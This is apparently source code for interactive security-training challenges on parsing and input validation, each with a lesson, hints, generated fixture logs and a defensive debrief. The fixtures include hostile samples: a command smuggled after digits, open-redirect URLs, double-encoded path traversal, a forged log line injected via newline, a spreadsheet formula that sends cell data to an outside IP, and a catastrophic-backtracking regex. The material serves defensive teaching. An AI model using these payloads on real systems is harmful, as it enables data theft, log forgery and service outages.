// Track: Parsing, Cleaning & Validation. Most vulnerabilities start where a
// program reads text it didn't write. Regex, anchoring, canonicalisation, log and
// CSV hygiene, Unicode lookalikes, ReDoS, and a signed-length bug in C.
import { norm } from "../flags.js";

const two = (n) => String(n).padStart(2, "0");
const USERS = ["ana", "ben", "chloe", "dev", "elif", "farid", "grace", "hugo", "ines", "jonas", "kira", "liam", "maya", "noor", "omar", "priya"];

export default [
  {
    id: "parse-regex",
    title: "Describe the Shape",
    level: 2,
    slug: "regex_finds_the_needle",
    time: 12,
    certs: ["CySA+", "Security+", "GCIH", "GSEC"],
    objective: "Exactly one line in this log contains a correctly formatted session token. Write a regular expression that isolates it and submit the flag on that line.",
    lesson: `Security work is full of text: logs, configs, emails, source code, packet payloads. A **regular expression** (regex) is a compact way to describe the *shape* of the text you're looking for, and every tool you'll use speaks it: \`grep\`, SIEM queries, IDS rules, YARA, input validators.

### The building blocks
| Pattern | Matches |
|---|---|
| \`abc\` | those exact characters |
| \`.\` | any one character |
| \`\\d\` | a digit (same as \`[0-9]\`) |
| \`\\w\` | a letter, digit or underscore |
| \`\\s\` | whitespace |
| \`[A-Z]\` | one character from the set (here: an uppercase letter) |
| \`[^0-9]\` | one character **not** in the set |
| \`x*\` \`x+\` \`x?\` | zero or more, one or more, zero or one of x |
| \`x{4}\` \`x{2,5}\` | exactly 4, or 2 to 5, of x |
| \`( … )\` | group |
| \`^\` \`$\` | start and end of the line |
| \`\\b\` | a **word boundary**: the edge between a word character and a non-word character |
| \`\\.\` | a literal dot (the backslash removes a character's special meaning) |

Two more: \`cat|dog\` matches either alternative, and parentheses group things so a quantifier can apply to the whole group: \`(ab)+\`.

### Being precise
"Roughly right" patterns are how both detections and validators fail. \`\\d{4}\` happily matches the first four digits of a five-digit number. To say "exactly four digits, then a dash", put the dash in the pattern. To say "exactly two letters and then the token ends", finish with \`\\b\`.

### The log viewer
In the filter box, text between slashes is a regex: \`/error \\d+/\`. It is case-sensitive unless you add \`i\` after the closing slash. Matches are highlighted.

### Your task
Valid session tokens have this exact format: \`tok_\`, then **exactly four digits**, a **dash**, then **exactly two uppercase letters**. The log contains dozens of near misses (three or five digits, lowercase letters, an underscore instead of the dash, three letters…) and one valid token. Each line carries a reference code that looks like a flag; only the one on the valid line is yours.`,
    hints: ["Start simple and tighten: /tok_\\d{4}/ still matches many lines. What must come right after the four digits?", "Add the dash and the letters: /tok_\\d{4}-[A-Z]{2}/. A few lines with three letters still match.", "End with a word boundary: /tok_\\d{4}-[A-Z]{2}\\b/ leaves exactly one line."],
    workspace: { type: "files" },
    setup(ctx) {
      const slug = "regex_finds_the_needle";
      const L = () => String.fromCharCode(65 + ctx.int(0, 25));
      const d = (n) => Array.from({ length: n }, () => ctx.int(0, 9)).join("");
      const bad = [
        () => `tok_${d(3)}-${L()}${L()}`,
        () => `tok_${d(5)}-${L()}${L()}`,
        () => `tok_${d(4)}-${(L() + L()).toLowerCase()}`,
        () => `tok_${d(4)}-${L()}${L()}${L()}`,
        () => `tok_${d(4)}_${L()}${L()}`,
        () => `tok_${d(2)}${ctx.pick(["O", "l", "x"])}${d(1)}-${L()}${L()}`,
        () => `tk_${d(4)}-${L()}${L()}`,
        () => `tok_${d(4)}-${L()}${ctx.int(0, 9)}`,
        () => `tok_${d(4)}-${L()}${L()}${ctx.int(0, 9)}`,
      ];
      const n = 72, target = ctx.int(15, n - 10);
      const lines = [];
      for (let i = 0; i < n; i++) {
        const tok = i === target ? `tok_${d(4)}-${L()}${L()}` : bad[i % bad.length]();
        const ref = i === target ? ctx.flag : `BREACH{${slug}_${ctx.hex(6)}}`;
        const m = 14 * 60 + i * 3 + ctx.int(0, 2);
        lines.push(`2026-11-06T09:${two(Math.floor(m / 60) % 60)}:${two(m % 60)}Z gw-${ctx.int(1, 3)} session=${tok} user=${ctx.pick(USERS)} ref=${ref}`);
      }
      return { files: [{ name: "gateway.log", kind: "log", note: "API gateway log. Use the filter box: /regex/ between slashes.", data: lines.join("\n") }] };
    },
    debrief: `Each tightening of the pattern removed a family of near misses: the dash excluded underscores and five-digit numbers, \`[A-Z]{2}\` excluded lowercase and digits, and the final \`\\b\` excluded three-letter and letter-digit endings. The precise pattern left one line.

### Why precision matters
- A **detection** that's too loose buries analysts in false positives; too tight and it misses variants.
- A **validator** that's too loose is a vulnerability, which is the subject of the next challenge.
- Test patterns against both things that should match *and* things that shouldn't. Near misses are the useful test cases.

### Where you'll use this
\`grep -E\`, Splunk/Elastic queries, Sigma and Suricata rules, YARA strings, secret scanners, data-loss-prevention rules (card and ID number formats) are all regex underneath.

**On the exam:** CySA+ includes regular expressions explicitly in its log-analysis tooling objectives; GCIH and Security+ assume you can search logs effectively.`,
  },

  {
    id: "parse-anchors",
    title: "The Validator That Forgot the Ends",
    level: 3,
    slug: "anchor_your_allow_list",
    time: 12,
    certs: ["Security+", "PenTest+", "CEH", "GSEC"],
    objective: "A redirect endpoint validates its target URL with a regex. One of the logged requests is hostile and still passes the check. Submit its request ID.",
    answerLabel: "Request ID",
    answerPlaceholder: "e.g. R3",
    lesson: `**Input validation** means deciding whether data is acceptable *before* using it. There are two strategies:

- **Deny-list**: reject known-bad things (\`<script>\`, \`../\`, \`' OR\`). Attackers only need one variation you didn't list.
- **Allow-list**: accept only what matches a strict description of *good* input, and reject everything else. This is the one that works.

Regex is the usual tool for allow-lists, and the usual way they fail is a missing **anchor**.

### Searching is not validating
A regex without anchors asks "does this pattern appear **somewhere** in the text?". For validation you must ask "is the **entire** text exactly this?".

\`\`\`
pattern:  [0-9]+
"12345"            matches
"12345; rm -rf"    also matches: digits appear somewhere
\`\`\`

Add \`^\` (start) and \`$\` (end), and only the first string passes: \`^[0-9]+$\`.

### Python's trap
- \`re.search(p, s)\`: pattern anywhere in s.
- \`re.match(p, s)\`: pattern at the **start** of s. It says nothing about where s **ends**.
- \`re.fullmatch(p, s)\`: the whole string. This is the one for validation.

### Why URL checks are a favourite target
A hostname is read right to left: in \`shop.example.com.attacker.net\`, the registered domain is \`attacker.net\`, and everything before it is just a subdomain label the attacker chose. A check that only confirms the URL *begins* with something trusted proves nothing about where it actually goes.

Also remember \`.\` means "any character" unless escaped: \`example.com\` as a regex also matches \`exampleXcom\`.

### Your task
\`redirect.py\` implements \`/go?next=URL\` and is supposed to redirect only to the company's own \`example.com\` subdomains. \`requests.txt\` lists seven \`next\` values. Work out which ones pass the check. One of those leads to a host the company does not control. Submit its ID.`,
    hints: ["re.match anchors only the start. For each URL, ask: does it START with https://, some lowercase letters, then .example.com?", "URLs that pass can have anything at all after that prefix.", "Look for a passing URL where example.com is followed by more dots: the real domain is whatever comes last."],
    workspace: { type: "files" },
    setup(ctx) {
      const evilDom = ctx.pick(["attacker.net", "evil-cdn.org", "login-check.io", "acct-verify.co"]);
      const urls = ctx.shuffle([
        ["https://shop.example.com/cart", false],
        ["https://help.example.com/articles/42", false],
        [`https://shop.example.com.${evilDom}/login`, true],
        [`https://${evilDom}/?next=https://shop.example.com/`, false],
        ["http://shop.example.com/cart", false],
        [`https://shop-example.com/`, false],
        [`https://example.com.${evilDom}/`, false],
      ]);
      const k = urls.findIndex((u) => u[1]);
      const py = String.raw`import re
from flask import redirect, abort

ALLOWED = r"https://[a-z]+\.example\.com"

def go(request):
    target = request.args.get("next", "")
    if re.match(ALLOWED, target):          # is the destination one of ours?
        return redirect(target)
    abort(400)
`;
      const list = urls.map((u, i) => `R${i + 1}   /go?next=${u[0]}`).join("\n");
      return { _id: `r${k + 1}`, files: [
        { name: "redirect.py", kind: "code", label: "PY", note: "The redirect handler and its allow-list pattern.", data: py },
        { name: "requests.txt", kind: "text", note: "Seven requests seen today. Which pass the check, and where do they really lead?", data: list + "\n" },
      ] };
    },
    check(input, ctx, env) { const v = norm.text(input).replace(/\s+/g, ""); return v === env._id || "r" + v === env._id; },
    debrief: `\`re.match\` confirmed that the URL *started* with \`https://shop.example.com\` and stopped looking. The rest of the hostname, \`.attacker-controlled-domain\`, sailed through, and the site redirected its own users to a hostile server. The link begins with the genuine domain, so it looks trustworthy in an email: a ready-made phishing aid called an **open redirect**.

The other hostile-looking requests failed for the right reasons (wrong scheme, trusted name only in the query string, a dash instead of a dot, no subdomain).

### How to do it properly
- **Anchor both ends**: \`re.fullmatch\`, or \`^…$\` (in Python prefer \`\\A…\\Z\`, since \`$\` also matches before a trailing newline).
- Better: **parse, then compare**. Use a URL parser to extract the hostname and check it against an exact allow-list: \`urlparse(target).hostname in {"shop.example.com", "help.example.com"}\`.
- Best: don't accept full URLs at all. Accept a path or an ID and build the destination server-side.
- Unit-test validators with hostile inputs, not only with valid ones.

**On the exam:** allow-list vs deny-list validation and open redirects appear in Security+, PenTest+ and CEH web objectives (CWE-20, CWE-601).`,
  },

  {
    id: "parse-canonical",
    title: "Decode First, Then Decide",
    level: 3,
    slug: "canonicalize_before_validating",
    time: 13,
    certs: ["Security+", "PenTest+", "CySA+", "CEH"],
    objective: "A filter blocks ../ in download requests, yet one traversal attempt got a 200. Find it, decode it fully, and submit the flag in the path it actually requested.",
    lesson: `The same data can be written many ways. A dot is \`.\`, but in a URL it can also be \`%2e\`. A slash can be \`/\`, \`%2f\`, or on Windows \`\\\`. A filter that looks for one spelling of something dangerous will miss the others.

### Canonical form
The **canonical** form of a value is its one simplest, fully decoded representation. The rule of safe input handling:

1. **Decode / normalise** the input to canonical form, completely.
2. **Validate** that canonical value.
3. **Use** exactly the value you validated. Never decode again afterwards.

Get the order wrong and you validate one string but use another.

### Double encoding
URL encoding writes a byte as \`%\` plus two hex digits: \`.\` is \`%2e\`, \`/\` is \`%2f\`, and the percent sign itself is \`%25\`. That last one enables a trick:

\`\`\`
../              the real thing: the filter sees it and blocks
%2e%2e%2f        encoded once: a decent filter decodes, then blocks
%252e%252e%252f  encoded TWICE
\`\`\`

The web server decodes the request once, giving \`%2e%2e%2f\`. The filter sees no \`../\` and allows it. Then the application decodes the parameter **a second time** before opening the file, and \`../\` appears, after the check has already passed.

\`../\` means "go up one directory", so a download handler that opens \`/srv/files/\` + name can be walked out of its folder to any file the process can read. That is **path traversal** (directory traversal).

### Your task
\`access.log\` shows requests to \`/download\`. The filter returned 403 for the obvious attempts. Find the traversal request that returned **200**, copy its \`file=\` value into the Toolkit and run **URL decode** until nothing changes. The decoded path contains the flag.`,
    hints: ["Filter the log for 200 and for %25: that is an encoded percent sign, the mark of double encoding.", "Copy everything after file= from that line into the Toolkit and run URL decode.", "Use 'Use output as input' and run URL decode a second time. The path now reads ../../… and ends with the flag."],
    workspace: { type: "files" },
    setup(ctx) {
      const enc2 = (s) => [...s].map((c) => (/[a-z0-9]/i.test(c) ? c : "%25" + c.charCodeAt(0).toString(16))).join("");
      const enc1 = (s) => [...s].map((c) => (/[a-z0-9]/i.test(c) ? c : "%" + c.charCodeAt(0).toString(16))).join("");
      const atk = "203.0.113." + ctx.int(2, 250);
      const files = ["report_q3.pdf", "invoice_1042.pdf", "handbook.pdf", "logo.png", "pricing.csv", "minutes_oct.docx"];
      const lines = [];
      let sec = 9 * 3600 + ctx.int(0, 600);
      const add = (ip, path, code, size) => { sec += ctx.int(2, 40); lines.push(`${ip} - - [06/Nov/2026:${two(Math.floor(sec / 3600))}:${two(Math.floor(sec / 60) % 60)}:${two(sec % 60)} +0000] "GET /download?file=${path} HTTP/1.1" ${code} ${size}`); };
      const ok = () => add("10.2.0." + ctx.int(10, 99), ctx.pick(files), 200, ctx.int(20000, 900000));
      for (let i = 0; i < 9; i++) ok();
      add(atk, "../../etc/passwd", 403, 153);
      ok();
      add(atk, "..%2f..%2fetc%2fpasswd", 403, 153);
      add(atk, enc1("../../etc/passwd"), 403, 153);
      for (let i = 0; i < 4; i++) ok();
      add(atk, enc2(`../../private/${ctx.flag}.txt`), 200, 2048);
      for (let i = 0; i < 7; i++) ok();
      add(atk, enc2("../../private/backup.tar"), 200, 48211003);
      ok(); ok();
      return { files: [{ name: "access.log", kind: "log", note: "Web server access log for the download endpoint. The WAF rule blocks any request containing ../ after one URL decode.", data: lines.join("\n") }] };
    },
    debrief: `The attacker tried the plain \`../\`, then a single encoding: both blocked. The double-encoded version passed, because after the filter's one decode it was still just harmless-looking \`%2e%2e%2f\`. The application decoded again and walked out of the download folder.

The filter and the application disagreed about what the input *was*. That disagreement, not the specific characters, is the vulnerability, and it is the pattern behind a long list of famous bugs.

### How defenders stop it
- **Canonicalise, then validate, then use**, with no further decoding after the check. Reject input that is still encoded after decoding once.
- Don't hunt for bad substrings at all. **Resolve the final path** (\`realpath\`) and verify it is still inside the intended directory.
- Better still, never build paths from user input: map an ID to a file server-side.
- Run the service with least privilege so a traversal can't reach sensitive files; alert on \`%25\`, \`..\` and encoded separators in parameters.

**On the exam:** directory traversal, canonicalisation and encoding-based filter evasion are tested in Security+, PenTest+, CySA+ and CEH (CWE-22, CWE-180).`,
  },

  {
    id: "parse-crlf",
    title: "A Log Line That Lies",
    level: 3,
    slug: "sanitize_what_you_log",
    time: 12,
    certs: ["CySA+", "Security+", "GCIH", "PenTest+"],
    objective: "An attacker forged an entry in the authentication log by smuggling a line break into a username. Submit the line number of the forged entry.",
    answerLabel: "Line number",
    answerPlaceholder: "a line number",
    lesson: `Logs are evidence. Investigators, alerting rules and auditors all assume that each line was written by the application and describes something that happened. But many log lines include **text supplied by the user**: a username, a URL, a User-Agent. If that text is written out raw, the user is co-author of your logs.

### The newline is the delimiter
A text log is "parsed" by one rule: **a line break ends an entry**. The characters are carriage return (CR, \`\\r\`, byte 0x0d) and line feed (LF, \`\\n\`, byte 0x0a), which in a URL are \`%0d\` and \`%0a\`.

If an application logs

\`\`\`
login failed for user "<whatever was typed>" from <ip>
\`\`\`

and someone submits a username containing \`%0a\` followed by text shaped like a log entry, the file gains an extra line the application never wrote. This is **log injection** (also *log forging*; the general technique is **CRLF injection**). It is used to:
- plant fake events (a successful admin login from a trusted address) to mislead an investigation or frame someone,
- hide real activity among noise, or break log parsers,
- attack whoever *views* the log, if the viewer renders it as HTML.

The same bug in HTTP headers (CRLF in a header value) lets an attacker add their own response headers: *HTTP response splitting*.

### Spotting a forged line
The injected text sits in the **middle** of a genuine entry, so the real entry is torn in two:
- the line before the forgery **stops abruptly** (an opening quote that never closes),
- the forged line carries the **leftover tail** of the real entry after its own text.

### Your task
\`auth.log\` is the application's log; \`access.log\` shows the raw requests. Find the login request with an encoded line break in its \`user\` value, then find the line it created in \`auth.log\`. Submit that forged line's number.`,
    hints: ["In access.log, filter for %0a: one login request has a line break inside the user parameter.", "In auth.log, find the entry whose username opens a quote but never closes it. The NEXT line is the forgery.", "The forged line ends with a stray tail: a closing quote and a second 'from <ip>'."],
    workspace: { type: "files" },
    setup(ctx) {
      const atk = "203.0.113." + ctx.int(2, 250);
      const auth = [], access = [];
      let sec = 10 * 3600 + ctx.int(0, 300);
      const stamp = () => `2026-11-06 ${two(Math.floor(sec / 3600))}:${two(Math.floor(sec / 60) % 60)}:${two(sec % 60)}`;
      const event = (user, ip, ok) => {
        sec += ctx.int(5, 70);
        auth.push(`${stamp()} INFO  [auth] login ${ok ? "ok" : "failed"} for user "${user}" from ${ip}`);
        access.push(`${ip} [${stamp()}] "POST /login?user=${user} HTTP/1.1" ${ok ? 302 : 401}`);
      };
      const normal = () => event(ctx.pick(USERS), "10.1.4." + ctx.int(10, 99), ctx.rng() > 0.2);
      const before = ctx.int(9, 18);
      for (let i = 0; i < before; i++) normal();
      event("admin", atk, false);
      event("admin", atk, false);
      sec += ctx.int(20, 60);
      const fakeTime = stamp();
      const forged = `${fakeTime} INFO  [auth] login ok for user "admin" from 10.1.0.5`;
      auth.push(`${fakeTime} INFO  [auth] login failed for user "guest`);
      auth.push(`${forged}" from ${atk}`);
      const forgedLine = auth.length;
      access.push(`${atk} [${fakeTime}] "POST /login?user=guest%0a${forged.replace(/ /g, "+").replace(/"/g, "%22").replace(/\[/g, "%5B").replace(/\]/g, "%5D")} HTTP/1.1" 401`);
      for (let i = 0; i < 8; i++) normal();
      return { _line: forgedLine, files: [
        { name: "auth.log", kind: "log", note: "Application authentication log, as an investigator would receive it.", data: auth.join("\n") },
        { name: "access.log", kind: "log", note: "Web server log of the same period: the raw requests.", data: access.join("\n") },
      ] };
    },
    check(input, ctx, env) { return norm.num(input) === env._line; },
    debrief: `The username was \`guest\`, a line break, and then a complete fake entry. The application wrote it out raw, so its own real line ended early at \`"guest\`, and the next line claimed a successful **admin login from an internal address**, with the tail of the genuine entry (\`" from 203.0.113.x\`) dangling off the end.

Anyone skimming the log, or any alert rule matching \`login ok for user "admin"\`, would have been fooled. The web server's access log, written by a different program, showed what was really sent. Independent sources are how forged evidence gets caught.

### How defenders stop it
- **Neutralise control characters** in everything logged: strip CR, LF and other non-printable characters, or write them as visible escape sequences instead of real line breaks.
- Prefer **structured logging** (JSON): the value is escaped inside a field and cannot create a new record.
- Validate the input in the first place: a username allow-list (\`^[a-z0-9_.-]{1,32}$\`) would have rejected this outright.
- Ship logs to a separate, append-only system and correlate across sources.

**On the exam:** log integrity, injection attacks and CRLF injection appear in CySA+, Security+ and PenTest+ (CWE-117, CWE-93).`,
  },

  {
    id: "parse-csv",
    title: "The Spreadsheet That Runs Code",
    level: 2,
    slug: "csv_formula_injection",
    time: 10,
    certs: ["Security+", "PenTest+", "CySA+", "GSEC"],
    objective: "Support tickets are exported to CSV for managers to open in a spreadsheet. One ticket would be executed as a formula. Submit its ticket ID.",
    answerLabel: "Ticket ID",
    answerPlaceholder: "e.g. T-1042",
    lesson: `**CSV** (comma-separated values) looks like the simplest format there is, which is why so much data moves through it and why it is parsed carelessly so often.

### How CSV is really parsed
\`\`\`
id,name,comment
T-1001,"Lee, Dana","She said ""thanks"" twice"
\`\`\`
- A comma separates fields, and a line break ends a record…
- …unless the field is wrapped in **double quotes**, in which case commas and even line breaks inside it are data.
- A quote inside a quoted field is written twice (\`""\`).

Splitting on commas by hand (\`line.split(",")\`) gets this wrong: \`"Lee, Dana"\` becomes two fields and every later column shifts. Use a real CSV parser, and expect attackers to probe the difference between your parser and the next one in the chain.

### Formula injection
The more surprising problem is what happens when a **spreadsheet** opens the file. Excel, LibreOffice and Google Sheets treat any cell that begins with \`=\`, \`+\`, \`-\` or \`@\` as a **formula** and evaluate it. So text typed into a web form by a stranger can become live spreadsheet logic on the desk of whoever opens the export, typically someone in finance or management. Formulas can pull in remote data, build links that send cell contents to an outside server, and in older or misconfigured setups launch programs.

This is **CSV injection** (formula injection). The application that produced the export is the vulnerable party: it handed untrusted text to an interpreter.

### Cleaning on output
The fix belongs where the CSV is written: if a field starts with \`=\`, \`+\`, \`-\`, \`@\` (or a tab or carriage return), prefix it with a single quote \`'\` so the spreadsheet shows it as text, and always quote fields properly.

A value such as \`-12.50\` in a numeric column is a legitimate negative number. The danger is **free text** that starts with one of those characters.

### Your task
Review \`tickets_export.csv\`. Find the ticket whose free-text comment would be evaluated as a formula, and submit its ID.`,
    hints: ["The comment is the last column. Look at the first character of each comment.", "A comment merely containing = somewhere in the middle is harmless text. Only the first character of the cell matters.", "One comment begins with =HYPERLINK(. Submit that row's ticket ID."],
    workspace: { type: "files" },
    setup(ctx) {
      const id = () => "T-" + ctx.int(1000, 9999);
      const comments = ctx.shuffle([
        "Refund processed, thank you",
        '"Order arrived late, but support was quick"',
        "Please update my address",
        '"Rating=5, would buy again"',
        "Card was charged twice - please check",
        '"Lee said ""great service"" on the phone"',
        "App crashes when I open settings",
        "Invoice total looks wrong @ checkout",
        "Can I change my delivery slot?",
        "Still waiting for a reply (3rd email)",
        "Discount code did not apply",
      ]);
      const evil = `"=HYPERLINK(""http://203.0.113.${ctx.int(2, 250)}/c?d=""&B2&C2,""View refund status"")"`;
      const names = ['"Lee, Dana"', "Omar Haddad", '"Okafor, Ngozi"', "Priya Nair", "Jonas Weber", '"Silva, Rosa"', "Tess Novak", "Yusuf Demir", "Wren Castillo", "Ines Duarte", "Hugo Laurent", "Maya Cohen"];
      const k = ctx.int(3, comments.length - 2);
      const rows = [], ids = new Set();
      let evilId = "";
      for (let i = 0; i <= comments.length; i++) {
        let t; do t = id(); while (ids.has(t)); ids.add(t);
        const isEvil = i === k;
        if (isEvil) evilId = t;
        const c = isEvil ? evil : comments[i > k ? i - 1 : i];
        const amount = ctx.pick(["19.99", "-12.50", "240.00", "-5.00", "64.10"]);
        rows.push(`${t},${names[i % names.length]},${ctx.pick(USERS)}@mail.example,${amount},${c}`);
      }
      return { _id: evilId.toLowerCase(), files: [{ name: "tickets_export.csv", kind: "log", note: "Nightly export opened by managers in a spreadsheet. Columns: ticket, customer, email, adjustment, comment.", data: "ticket_id,customer,email,adjustment,comment\n" + rows.join("\n") }] };
    },
    check(input, ctx, env) { const v = norm.text(input).replace(/\s+/g, ""); return v === env._id || "t-" + v.replace(/^t/, "") === env._id; },
    debrief: `One customer's "comment" began with \`=\`, so a spreadsheet would treat the cell as a formula: here a \`HYPERLINK\` whose address is built from the neighbouring cells. A manager clicking the innocent-looking "View refund status" would send other customers' data to the attacker's server.

The decoys were all harmless: \`=\` and \`@\` in the *middle* of text, quoted commas and doubled quotes (ordinary CSV syntax), and negative numbers in a numeric column.

### How defenders stop it
- **Neutralise on export**: prefix cells that start with \`=\`, \`+\`, \`-\`, \`@\`, tab or CR with \`'\`, and quote every field (OWASP's CSV-injection guidance).
- Validate on input where the field has a known shape, but don't rely on it: the same data may be exported by a system written years later.
- Generate real spreadsheet files with typed cells when the audience is spreadsheet users.
- Teach staff that an exported file can carry active content: heed the "enable content / update links?" warnings.

**On the exam:** injection is "untrusted data sent to an interpreter"; CSV/formula injection is a named variant in PenTest+ and OWASP material, and output encoding is a Security+ secure-coding objective.`,
  },

  {
    id: "parse-unicode",
    title: "Looks the Same, Isn't the Same",
    level: 3,
    slug: "normalize_then_compare",
    time: 12,
    certs: ["Security+", "CySA+", "PenTest+", "GSEC"],
    objective: "Two accounts in this user list display as \"admin\". One is an impostor using a lookalike character. Submit the impostor's account ID.",
    answerLabel: "Account ID",
    answerPlaceholder: "a number",
    lesson: `Computers compare **bytes**. People compare **shapes**. Unicode has over a hundred thousand characters, and many of them look identical to each other.

### Text is encoded
ASCII gives the basic Latin letters one byte each: \`a\` is 0x61. Everything else is stored in **UTF-8** as two to four bytes, each with its high bit set (0x80–0xff):

| Character | Looks like | Bytes (UTF-8) |
|---|---|---|
| Latin \`a\` (U+0061) | a | \`61\` |
| Cyrillic \`а\` (U+0430) | a | \`d0 b0\` |
| Latin \`e\` with accent \`é\` (U+00E9) | é | \`c3 a9\` |
| Zero-width space (U+200B) | *(nothing)* | \`e2 80 8b\` |

So \`admin\` and \`аdmin\` (with a Cyrillic first letter) are **different strings** that render identically. To a database's uniqueness check they are two usernames. To a human reading a list, an audit log or a chat window, they are the same person.

### Where this bites
- **Impersonation**: register a lookalike of an admin, a colleague or a brand (the domain version is the *homograph attack* from the Recon track).
- **Filter evasion**: a blocked word written with lookalikes or with invisible characters inside it no longer matches the filter.
- **Inconsistent handling**: one component normalises or case-folds the text and another doesn't, so they disagree about whether two names are equal.

### Cleaning text properly
- **Normalise** to one Unicode form (NFKC) before validating or comparing, so equivalent sequences become identical.
- For identifiers, **allow-list** the characters (for example \`^[a-z0-9_.-]+$\`) and reject mixed-script names.
- Strip or reject invisible and control characters.

### Finding it
A hex view never lies: non-ASCII characters show up as bytes 0x80 and above, and as dots in the ASCII column. In the log view, the regex \`/[^\\x00-\\x7f]/\` matches any line containing a non-ASCII character.

### Your task
\`users.txt\` is an export of account IDs and usernames. Some names legitimately contain accented letters. Find the account that *looks like* \`admin\` but isn't spelled with plain ASCII, and submit its ID.`,
    hints: ["Filter users.txt with /[^\\x00-\\x7f]/ to list every line that contains a non-ASCII character.", "Several are ordinary accented names. One of the matching lines appears to read just 'admin'.", "That line's ID is the answer. The hex view of users.bin shows its first letter as bytes d0 b0."],
    workspace: { type: "files" },
    setup(ctx) {
      const base = ctx.shuffle(["ana", "ben", "chloé", "dev", "elif", "farid", "grace", "hugo", "inés", "jonas", "kira", "liam", "maya", "noor", "omar", "priya", "zoë", "rosa", "sami", "tess", "björn", "viktor"]);
      const a = ctx.int(2, 8), b = ctx.int(11, 19);
      const order = ctx.rng() > 0.5 ? ["admin", "аdmin"] : ["аdmin", "admin"];
      base.splice(a, 0, order[0]);
      base.splice(b, 0, order[1]);
      let id = 1000 + ctx.int(1, 40);
      let evil = 0;
      const lines = base.map((n) => { id += ctx.int(1, 9); if (n === "аdmin") evil = id; return `${id}  ${n}`; });
      const text = lines.join("\n") + "\n";
      return { _id: evil, files: [
        { name: "users.txt", kind: "log", note: "Account export: ID and username. Filter accepts /regex/.", data: text },
        { name: "users.bin", kind: "hex", note: "The same file, byte for byte.", data: new TextEncoder().encode(text) },
      ] };
    },
    check(input, ctx, env) { return norm.num(input) === env._id; },
    debrief: `Both lines displayed as \`admin\`, but one began with the bytes \`d0 b0\`: Cyrillic "а" (U+0430), not Latin "a" (0x61). The uniqueness check saw two different strings and allowed the registration. Anyone reading a user list, a comment thread or an audit trail would see the administrator.

The accented names were legitimate, which is why "reject all non-ASCII" is often not an acceptable fix. The real fix is deciding what your identifiers may contain and normalising before you compare.

### How defenders stop it
- Normalise (NFKC) and case-fold **before** uniqueness checks and comparisons, and store the normalised form.
- Restrict usernames to an allow-listed character set, or apply **confusable detection** (Unicode's "skeleton" algorithm) to block lookalikes of existing and reserved names.
- Reject invisible characters (zero-width spaces and joiners, bidirectional overrides) in identifiers and in source code: "Trojan Source" attacks hide logic that way.
- Show an unambiguous identifier (ID, verified badge) next to display names.

**On the exam:** homograph/lookalike attacks, input normalisation and impersonation appear in Security+, CySA+ and PenTest+.`,
  },

  {
    id: "parse-redos",
    title: "The Regex That Never Finishes",
    level: 3,
    slug: "catastrophic_backtracking",
    time: 12,
    certs: ["Security+", "PenTest+", "CySA+", "GSEC"],
    objective: "One of five input validators can be frozen by a short, harmless-looking string. Identify the vulnerable pattern and submit its letter.",
    answerLabel: "Pattern letter",
    answerPlaceholder: "A to E",
    lesson: `A validator runs on attacker-supplied input by definition. If the validator itself can be made to work for minutes on a 40-character string, the attacker has a denial-of-service that costs one HTTP request. With regular expressions, that is surprisingly easy to do by accident.

### Backtracking
Most regex engines (JavaScript, Python, Java, .NET, PCRE) match by trial and error. When a choice doesn't work out, they **backtrack** and try the next possibility. Normally that's instant. It explodes when the pattern can match the **same text in many different ways**.

Take \`^(a+)+$\` against \`aaaaaaaaaaaaaaaaaaaa!\`:
- The inner \`a+\` can take all the a's, or all but one, or all but two…
- The outer \`( )+\` can then split what's left into groups in every possible way.
- Because of the final \`!\`, **no** split succeeds, so the engine tries **all** of them: about 2^n for n letters. Each extra character doubles the time.

Twenty-five characters take a moment. Forty take longer than you'll wait. This is **catastrophic backtracking**, and exploiting it is **ReDoS** (regular-expression denial of service). It has caused real outages at major internet companies.

### How to recognise a dangerous pattern
Look for a **quantifier applied to a group that itself contains a quantifier**, where the inner part can match the same characters in more than one way:

- nested quantifiers: \`(a+)+\`, \`(\\d+)+\`
- a repeated group with an optional separator: \`(\\w+\\s?)+\`
- repeated alternatives that overlap: \`(a|aa)+\`, \`(\\w|\\d)+\`

…followed by something that can **fail** (often \`$\`), which forces the engine to try every arrangement.

Patterns built from simple character classes with plain or bounded quantifiers, such as \`^[a-z0-9_]{3,16}$\`, have only one way to match and are safe.

### Your task
\`validators.txt\` lists the five patterns an API uses to validate fields, and \`incident.txt\` describes the outage. Find the pattern with a nested, ambiguous quantifier and submit its letter.`,
    hints: ["Four patterns are just character classes with simple or bounded quantifiers. They can only match one way.", "Look for a group in parentheses that has a repeat (plus or star) inside it AND another repeat right after it.", "The pattern with (\\w+\\s?)+ can split a run of letters into groups in exponentially many ways."],
    workspace: { type: "files" },
    setup(ctx) {
      const pats = ctx.shuffle([
        ["date of birth", String.raw`^\d{4}-\d{2}-\d{2}$`, false],
        ["username", String.raw`^[a-z0-9_]{3,16}$`, false],
        ["full name", String.raw`^(\w+\s?)+$`, true],
        ["postcode", String.raw`^[A-Z]{1,2}\d{1,2} ?\d[A-Z]{2}$`, false],
        ["discount code", String.raw`^(SAVE|VIP)-\d{6}$`, false],
      ]);
      const letter = "ABCDE"[pats.findIndex((p) => p[2])];
      const list = pats.map((p, i) => `${"ABCDE"[i]}   ${p[0].padEnd(15)} ${p[1]}`).join("\n");
      const incident = `INCIDENT SUMMARY

14:02  CPU on all four API workers pinned at 100%. Health checks time out.
14:03  Load balancer marks every worker unhealthy. Site returns 503.
14:09  Workers restarted. They recover, then hang again within a minute.

Finding: each hang follows a single POST /api/signup from the same client.
Every field in the request was under 50 characters. Nothing looked malicious:
one field was a long run of letters followed by a "!" character.

Profiler: 100% of worker time is inside the regex engine, in field validation.

Timing of the affected validator on a test machine:
  input length 20  ->      0.4 s
  input length 22  ->      1.7 s
  input length 24  ->      6.9 s
  input length 26  ->     27.5 s     (each +2 characters = about 4x slower)
`;
      return { _l: letter.toLowerCase(), files: [
        { name: "validators.txt", kind: "text", note: "Field validation patterns used by POST /api/signup.", data: `ID  field           pattern\n--  --------------  ------------------------------\n${list}\n` },
        { name: "incident.txt", kind: "text", note: "What operations observed.", data: incident },
      ] };
    },
    check(input, ctx, env) { return norm.text(input).replace(/[^a-e]/g, "") === env._l; },
    debrief: `The full-name pattern \`^(\\w+\\s?)+$\` repeats a group that itself contains \`\\w+\`, and the separator is optional. A run of letters can therefore be carved into groups in exponentially many ways. Add one character at the end that can't match (\`!\`), and the engine dutifully tries every carving before giving up. The timing table shows the signature: time multiplying with each added character.

The other four patterns have exactly one way to match any input, so they fail fast.

### How defenders stop it
- **Rewrite** to remove the ambiguity: \`^\\w+(\\s\\w+)*$\` matches the same names with a single possible parse.
